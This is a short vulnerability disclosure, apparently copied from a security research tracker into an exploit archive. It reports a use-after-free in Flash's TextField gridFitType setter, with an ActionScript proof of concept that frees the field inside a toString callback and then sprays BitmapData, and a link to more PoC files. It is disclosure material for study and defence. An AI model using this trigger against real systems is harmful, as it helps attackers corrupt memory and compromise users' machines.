@@ -1,0 +1,24 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=418&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There is a use-after-free in the TextField gridFitType setter. A PoC is below:
+
+var test = this.createTextField("test", 1, 0, 0, 100, 100);
+var n = {toString : func, valueOf : func};
+test.gridFitType = n;
+
+function func(){
+	
+	test.removeTextField();
+	for(var i = 0; i < 1000; i++){
+		var b = new flash.display.BitmapData(1000, 1000, true, 10);
+		}
+	trace("here");
+	return "natalie";
+	
+	}
+
+A PoC and fla are attached. Some other setters (thickness, tabIndex, etc.) are also impacted by the same UaF condition, additional SWFs are attached.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37877.zip
+
